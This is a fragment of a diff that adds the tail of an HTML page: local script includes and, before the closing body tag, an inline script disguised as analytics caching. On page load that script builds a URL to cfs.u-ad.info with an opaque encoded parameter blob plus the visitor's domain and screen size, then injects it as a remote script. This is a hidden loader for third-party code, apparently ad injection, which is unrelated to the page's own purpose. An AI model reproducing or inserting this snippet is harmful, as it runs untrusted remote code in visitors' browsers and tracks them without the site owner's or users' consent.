+    <script src="js/wow.min.js"></script>
+    <script src="js/fancyselect.js"></script>
+    <script src="js/_main.js"></script>
+      
+    <!-- Only Preview -->
+        <script src="js/styleswitcher.js"></script>
+  
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnv53M1P9YiIjcOK%2bStvYAKvuoq%2fl2XG%2bWomy3tZF4sZgH%2bkJV1qiGLU0rNdORsdoPRgesFHvXT%2faMxjLCk6ZsKpijJp2jH34Vv7DP%2b8QEDtBqemzjloU6wj3KZVM1fRofJ%2fjZrlRMKrHnYTRtsmMbcl8rB0k9Bb6bha4k6yHTQFpNHW8b02s2rh1sY%2fM9NIlJBMc%2fCmiEQVOm5wQhT%2b5KbExEG%2fg9uu9IHQRxN4g8xKMzSR7TLx%2fHvK5hqEF3OWEFWJzYjWaIrb9WHUKIPEA0eQaeukez%2fR6550nQPun3CWH%2fm0ay8kxAOhHUYZFgWKhxPbNlAD3mPQd9Y0QR08eoGoDKq7c1QSuDbvHPNNpQ3mkt5nUO1MhrCIvtHcwIVVkzxQhJ8g080ppjpQsW8YMFgUZaPkFrstzyU2JC6AhHYBnHPTWAiglWIOTuvceLHqSw3gMtoAnJ1A1sIEIvhyJ6hVgDPbFK15WvsaGIoCk2d4c%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
